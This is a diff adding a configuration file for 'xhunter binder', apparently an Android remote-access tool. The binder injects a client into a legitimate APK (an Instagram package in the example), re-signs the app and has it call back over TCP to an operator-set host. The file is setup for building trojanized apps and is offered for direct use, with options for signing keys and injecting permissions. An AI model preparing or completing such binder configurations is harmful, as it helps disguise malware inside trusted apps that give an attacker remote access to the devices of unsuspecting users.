@@ -1,0 +1,27 @@
+# xhunter binder — edit this file, then run ./binder.sh (after ./setup.sh).
+# One KEY=value per line. UTF-8. Lines starting with # are comments.
+# On Windows, use Git Bash or WSL; save this file with Unix (LF) line endings.
+# Paths: macOS/Linux use /path/... ; Windows (Git Bash) often /c/Users/Name/...
+
+# ---- required ----
+# Server the merged app will call (TCP; port in client, often 8080).
+HOST=192.168.1.10
+
+# APK the binder will inject (absolute path, or path relative to the binder directory).
+HOST_APK=apps/instagram.apk
+
+# ---- optional ----
+# Output signed APK (default: ./out/xhunter-merged.apk)
+# OUT_APK=./out/xhunter-merged.apk
+
+# Apktool workspace: blank = temp dir; or a folder to keep decode output
+# WORK_DIR=
+
+# SIGN_KEY=vendor/client/xhunter_signing_key.pk8
+# SIGN_CERT=vendor/client/xhunter_signing_cert.pem
+# MIN_SDK=24
+# INJECT_PERMISSIONS=false
+# HOOK_LIST_MAX=20
+# KEEP_WORK=false
+# AAPT2=
+# FRAMEWORK_DIR=
